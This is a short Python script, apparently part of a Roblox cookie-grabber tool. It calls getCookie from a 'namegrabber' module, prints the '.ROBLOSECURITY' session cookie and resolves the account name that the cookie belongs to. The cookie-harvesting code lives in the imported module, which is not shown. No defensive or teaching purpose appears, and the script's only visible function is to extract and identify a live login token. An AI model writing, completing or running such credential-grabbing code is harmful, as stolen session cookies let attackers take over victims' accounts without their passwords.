from modules.utils.namegrabber import getCookie, getName

c = getCookie()

print(c[".ROBLOSECURITY"])

r = getName(c)

print(r)
